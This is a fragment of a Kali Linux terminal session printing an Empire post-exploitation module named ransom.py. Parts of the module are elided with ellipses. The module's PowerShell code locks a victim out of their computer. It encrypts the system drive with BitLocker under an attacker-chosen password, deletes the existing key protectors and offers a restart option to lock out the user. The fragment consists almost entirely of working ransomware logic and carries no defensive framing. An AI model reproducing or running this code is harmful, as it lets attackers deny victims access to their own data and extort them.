...
Invoke-Ransom"""
        ...
        return script
root@kali:~/Desktop/Empire/lib/modules/powershell/trollsploit# cat ransom.pyfrom lib.common import helpers
...
class Module:
    ...
    def __init__(self, mainMenu, params=[]):
	    ...
	    'Restart': {
                'Description':   'Switch. Restart computer to lock out user.',
                'Required'   :   False,
                'Value'      :   ''
            }
        }
...
enable-bitlocker -EncryptionMethod Aes256 -password $securepassword -mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest -UsedSpaceOnly > $null
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ > $null
}
...
$IDS = $check.KeyProtector.KeyProtectorID
foreach($ID in $IDS){
Remove-BitlockerKeyProtector -Mountpoint $ENV:SystemDrive -KeyProtectorID $ID > $null
}
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -PasswordProtector -Password $securepassword > $null
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ > $null
